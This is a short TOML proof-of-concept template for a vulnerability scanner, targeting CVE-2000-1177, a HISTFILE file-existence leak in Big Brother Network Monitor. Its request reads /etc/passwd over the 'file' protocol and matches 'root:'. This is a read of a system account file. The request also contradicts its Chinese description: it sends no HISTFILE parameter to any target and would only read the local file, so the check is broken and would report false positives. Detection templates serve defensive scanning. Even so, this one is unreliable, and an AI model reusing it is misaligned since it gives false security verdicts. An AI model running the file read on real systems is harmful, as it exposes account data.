[info]
author = "ave"
description = "检测 Big Brother (BB) Network Monitor 监控系统是否存在 HISTFILE 参数文件存在性泄露漏洞。通过向监控系统发送带有特定文件路径的 HISTFILE 参数，验证系统是否会返回文件和用户 ID 的存在性确认，从而泄露系统内部结构信息。"
id = "POC-AVE-2000-0833"
name = "Big Brother Network Monitor HISTFILE 参数文件存在性泄露 PoC"
severity = "medium"
tags = ["ave-2000-0833"]
vuln_id = [
    "CVE-2000-1177",
    "AVE-2000-0833",
]

[poc]
logic = "all"

[[poc.requests]]
path = "/etc/passwd"
protocol = "file"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]
